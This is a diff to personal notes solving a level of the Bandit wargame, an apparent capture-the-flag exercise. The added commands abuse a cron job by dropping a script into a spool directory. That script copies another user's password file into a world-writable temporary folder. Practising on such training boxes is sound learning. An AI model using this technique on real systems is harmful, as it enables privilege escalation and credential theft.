@@ -61,7 +61,19 @@
            cat /usr/bin/cronjob_bandit23.sh
            echo I am user bandit23 | md5sum | cut -d ' ' -f 1
            cat /tmp/8ca319486bfbbc3663ea0fbe81326349
-23 -> 24:  
+23 -> 24:  ls -al /etc/cron.d
+           cat /etc/cron.d/cronjob_bandit23
+           cat /usr/bin/cronjob_bandit23.sh
+           mkdir -p /tmp/bandit23
+           chmod o+w /tmp/bandit23
+           ---
+           [Create a bash file, and put in contents, set +x]:
+           #!/bin/bash
+           cat /etc/bandit_pass/bandit24 > /tmp/bandit23/bandit24
+           ---
+           cp 24 /var/spool/bandit24/foo/
+           cat /tmp/bandit23/bandit24
+24 -> 25:  
 
 
 
